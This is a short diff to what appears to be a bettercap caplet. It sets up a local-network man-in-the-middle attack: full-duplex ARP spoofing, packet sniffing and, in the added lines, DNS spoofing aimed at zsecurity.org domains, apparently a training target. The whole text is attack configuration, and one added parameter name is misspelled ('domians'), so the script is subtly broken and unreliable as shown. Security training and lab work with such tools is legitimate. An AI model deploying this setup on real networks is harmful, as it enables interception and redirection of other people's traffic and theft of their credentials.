@@ -2,4 +2,6 @@ net.probe on
 set arp.spoof.fullduplex true
 set arp.spoof.targets 
 arp.spoof on
+set dns.spoof.all true
+set dns.spoof.domians zsecurity.org , *.zsecurity.org
 net.sniff on
